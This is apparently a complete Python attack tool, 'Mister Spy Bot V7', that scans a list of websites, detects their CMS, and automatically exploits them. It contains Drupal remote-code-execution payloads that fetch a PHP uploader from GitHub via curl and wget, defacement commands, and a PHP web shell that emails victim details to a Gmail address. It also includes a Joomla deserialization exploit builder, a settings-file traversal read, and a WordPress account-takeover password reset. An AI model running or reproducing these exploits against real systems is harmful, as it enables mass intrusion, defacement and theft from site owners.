#!/usr/bin/python
import urllib
import urllib3
from urllib import urlopen as o
import requests, re, urllib2, os, sys, codecs					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time,random
from random import sample as rand				   		
from platform import system	
import datetime
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init		
from urlparse import urlparse									
from requests.packages.urllib3.exceptions import InsecureRequestWarning

init (autoreset=True)

requests.packages.urllib3.disable_warnings (InsecureRequestWarning)
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 

def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
__      ___                   __ ____ ____ ______ 
\ \    / (_)                 /_ |___ \___ \____  |
 \ \  / / _ _ __   ___ _ __   | | __) |__) |  / / 
  \ \/ / | | '_ \ / _ \ '__|  | ||__ <|__ <  / /  
   \  /  | | |_) |  __/ |     | |___) |__) |/ /   
    \/   |_| .__/ \___|_|     |_|____/____//_/    
           | |                                    
           |_|                                
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)



print_logo()
now = datetime.datetime.now()
print('\n\033[92m                                                  STARTED AT: ' + str(now))
start_raw = raw_input("\n\033[92m[!]\033[91m WELCOME TO HELL ENTER LIST OF WEBSITES : ")
try:
    with open(start_raw, 'r') as f:
        sites = f.read().splitlines()
except IOError:
    pass
sites = list((sites))

		

shell = """<?php
$str = 'TWlzdGVyU3B5U2hlbGxGb3JWN0JvdDBYX2lzdGFuYnVsXzIwMTk=';echo base64_decode($str);

?>
<title>Mister Spy Bot V7</title>
<?php echo 'MisterSpyShellForV7Bot0X_istanbul_2019 uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Bot v6 Rzlt |$ip";
$email = "sellerolux@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>"""
shell_name = str(time.time())[:-3]
filenamex = "up_"+str(shell_name)+".php.php"
filename = "Files/shell.jpg"
kcfile = "Files/up.php.jd"
louisxv = "Files/shell.php.xxxjpg"
path = str(time.time())[:-3]
jceupshell = "Files/up.php"
filte = "Files/up.php"
fck = "Files/spy.txt"
imagess = "Files/pwn.gif"
indecx = "Files/spy.html"
filevid = "Files/mah.PhP.txt"
indexxx = "Files/spy.txt"
louis = "Files/up.php"
payloadz = "<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
com_jdownloads = 'Files/up.php3.g'
com_jdownloads_index = 'Files/pwn.gif'
Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Manager.php','w+'),file_get_contents('https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Fuckedz.htm','w+'),' Vulnerability! Fuckedz By En Banglasia! ');"""
filenames = "Files/up.php"
def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass
def generate(payload):
    php_payload = "eval({0})".format(toCharCode(payload))
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
    return exploit_template
	
def cms(url):
	
	
    try:
        if requests.get(url + "/administrator/manifests/files/joomla.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/administrator/manifests/files/joomla.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "\033[0m[$] \033[92mURL:",url
            print "\033[0m[!]\033[92m Found Version: " + joomla_version[0]
            print "\033[0m[!]\033[92m CMS: Joomla"
            open('CMS/Joomla.txt', 'a').write(url+'\n')
            joomlaaa(url)
            smtps(url)
        elif requests.get(url + "/language/en-GB/en-GB.xml", verify=False).status_code == 200:
            joomla = requests.get(url + "/language/en-GB/en-GB.xml", verify=False)
            joomla_version = re.findall('<version>(.*?)<\/version>', joomla.text)
            print "[$] URL:",url
            print "\033[0m[!]\033[92m Found Version: " + joomla_version[0]
            print "\033[0m[!]\033[92m CMS: Joomla"
            open('CMS/Joomla.txt', 'a').write(url+'\n')
            joomlaaa(url)
            smtps(url)
    except:
        pass
    try:		
		
		Checktwo = requests.get(url, timeout=5)
		
		if "/wp-content/" in Checktwo.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: Wordpress"
			open('CMS/Wordpress.txt', 'a').write(url+'\n')
			wordpress(url)			
		else:
			print ''.format(sb, sd, url, fc,fc, sb,fr)
			Unknown(url)           		
    except:
        pass
    try:		
		
		Checktwo = requests.get(url, timeout=5)
		
		if "/sites/default/" in Checktwo.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: Drupal"
			open('CMS/Drupal.txt', 'a').write(url+'\n')
			drupal(url)			       			
    except:
        pass	
    try:		
		
		Checktwo = requests.get(url, timeout=5)
		
		if "prestashop" in Checktwo.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: Prestashop"
			open('CMS/Prestashop.txt', 'a').write(url+'\n')
			prestashop(url)					
    except:
        pass
    try:		
		
		CheckOsc = requests.get(url + '/admin/images/cal_date_over.gif')
		CheckOsc2 = requests.get(url + '/admin/login.php')
		
		if 'GIF89a' in CheckOsc.text.encode('utf-8') or 'osCommerce' in CheckOsc2.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: osCommerce"
			open('CMS/osCommerce.txt', 'a').write(url+'\n')
			osrce(url)						
    except:
        pass
    try:		
		
		Checktree = requests.get(url + '/application/configs/application.ini')
		
		if "APPLICATION_PATH" in Checktree.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: zen"
			open('CMS/zen.txt', 'a').write(url+'\n')
			zenbot(url)						
    except:
        pass
    try:		
		
		Checktwo = requests.get(url, timeout=5)
		
		if "Magento" in Checktwo.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: Magento"
			open('CMS/Magento.txt', 'a').write(url+'\n')					
    except:
        pass
    try:		
		
		Checktwo = requests.get(url, timeout=5)
		
		if "OpenCart" in Checktwo.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: OpenCart"
			open('CMS/OpenCart.txt', 'a').write(url+'\n')					
    except:
        pass
    try:		
		
		Checktwo = requests.get(url, timeout=5)
		
		if "vBulletin" in Checktwo.text.encode('utf-8'):
			print "\033[0m[$] \033[92mURL:",url
			print "\033[0m[!]\033[92m CMS: vBulletin"
			open('CMS/vBulletin.txt', 'a').write(url+'\n')					
    except:
        pass
######################### Drupal ##############################


def drupal(url):
	
	
    try:	


		#Avatarafd
		
		revlib = requests.get(url+"/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php")
		if 'drupal_hash_salt' in revlib.content:
			print '\033[92m[>] \033[0mExploit Avatarafd Config   \033[92m[Done] '.format(sn)
			open('Exploited/drupal-data.txt', 'a').write(url+'/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php'+'\n')
		else:
			print '\033[92m[>] \033[0mExploit Avatarafd Config  \033[91m[Failed] '.format(sn)	

		#1


		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/up.php')
		
		
		if re.findall("SpyUploaderV1", lib.content):
			print '\033[92m[>] \033[0mExploit Drupal 7  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		
		else:
			print '\033[92m[>] \033[0mExploit Drupal 7  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/up.php')
		
		
		if re.findall("SpyUploaderV1", lib.content):
			print '\033[92m[>] \033[0mExploit Drupal 7.1  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Drupal 7.1  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)				

		#2


		Index_page = "echo 'Defaced By Mister Spy' > def.htm"
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]': Index_page, 'name[#type]': 'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/def.htm')
		
		
		if re.findall("Defaced By Mister Spy", lib.content):
			print '\033[92m[>] \033[0mExploit Drupal 7 Index  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')

		else:
			print '\033[92m[>] \033[0mExploit Drupal 7 Index  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php', 'name[#type]':'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/up.php')
		
		
		if re.findall("MisterSpyShellForV7Bot0X_istanbul_2019", lib.content):
			print '\033[92m[>] \033[0mExploit Drupal 7.2  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Drupal 7.2 \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)				

		#3


		Index_page = "echo 'Defaced By Mister Spy' > def.htm"
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]': Index_page, 'name[#type]': 'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/def.htm')
		
		
		if re.findall("Defaced By Mister Spy", lib.content):
			print '\033[92m[>] \033[0mExploit Drupal 7.3  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')

		else:
			print '\033[92m[>] \033[0mExploit Drupal 7.3  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	

		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', verify=False, headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 7 Payload  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 7 Payload  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	


			
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8.1  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.1  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8.2  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.2  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			

				
		r = requests.post(url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php"})
		if 'SpyUploaderV1' in requests.get(url+'/up.php').text:
			print '\033[92m[>] \033[0mExploit Drupal 8.3  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.3  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fr)

		headers = {'User-Agent': 'Mozilla 5.0'}	
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo MisterSpyShellForV7Bot0X_istanbul_2019!! Defaced it Now!> def.htm'}
		payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + shell + '"> vuln.php'}			
		ar = requests.post(url+'/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, timeout=5)
		if 'Defaced' in requests.get(url+'/vuln.htm', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8 Index \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
			sys.exit()
			
		rr = requests.post(url+ '/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload2)
		if 'Defaced' in requests.get(url+'/vuln.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8.4  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
			sys.exit()			
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.4  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
            
        
		#4


		Index_page = "echo 'Defaced By Mister Spy ' > def.htm"
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]': Index_page, 'name[#type]': 'markup'}
		post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
		r = requests.post(url, data=post_params, params=get_params)
		
		
		m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
		if m:
		    found = m.group(1)
		
		get_params = {'q':'file/ajax/name/#value/' + found}
		post_params = {'form_build_id':found}
		r = requests.post(url, data=post_params, params=get_params)

		lib = requests.get(url+'/def.htm')
		
		
		if re.findall("Defaced By Mister Spy", lib.content):
			print '\033[92m[>] \033[0mExploit Drupal 7.4  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')

		else:
			print '\033[92m[>] \033[0mExploit Drupal 7.4  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			

		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', verify=False, headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 7 Payload  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 7 Payload  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	


			
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8.5  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.5  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8.6  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.6  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8.7  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.7  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)			

				
		r = requests.post(url+'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}, data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "curl https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php && wget https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php"})
		if 'SpyUploaderV1' in requests.get(url+'/up.php').text:
			print '\033[92m[>] \033[0mExploit Drupal 8.8  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/Shells.txt', 'a').write(url+'/up.php'+'\n')
			sys.exit()	
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8.8  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)

		headers = {'User-Agent': 'Mozilla 5.0'}	
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo Defaced  By Mister Spy!> def.htm'}
		payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + shell + '"> vuln.php'}			
		ar = requests.post(url+'/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, timeout=5)
		if 'Defaced  By Mister Spy' in requests.get(url+'/def.htm', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8 Index  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
			sys.exit()
			
		rr = requests.post(url+ '/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload2)
		if 'SpyUploaderV1' in requests.get(url+'/up.php', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8 Index  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
			sys.exit()			
		else:
			print '\033[92m[>] \033[0mExploit Drupal 8 Index  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)	
					

			
    except:
        pass


######################## Wordpress #######################		
def enum(url):

	try:

		for i in range(5):
			enum = urllib.urlencode({'cs_uid': i, 'action': 'cs_employer_ajax_profile'})
			data = requests.post(url + "/wp-admin/admin-ajax.php", data=enum, headers=headers, verify=False)
			login = re.findall(r'name="display_name" value=\"(.*?)\"',str(data.content))
			for user in login:
				return user

	except Exception as Exx:
		print(Exx)
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
		  "Accept": "*/*",
		  "Accept-Language": "en-US,en;q=0.5",
		  "Accept-Encoding": "gzip, deflate",
		  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
		  "X-Requested-With": "XMLHttpRequest",
		  "Connection": "close"}
		  
def rand_str (len = None) :
	if len == None :
		len = 8
	
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))

def wordpress(url):


	
    try:
		

		filenames = 'up' + '__' + rand_str (5) + '.php'
		# smmtpp
        

		# reset_success

		login = enum(url)
		
		pw = "ownertn2019"
		
		reset = urllib.urlencode({'new_pass': pw, 'confirm_new_pass': pw, 'user_login': login, 'action': 'cs_reset_pass'})
		data = requests.post(url + "/wp-admin/admin-ajax.php", data=reset, headers=headers, verify=False)

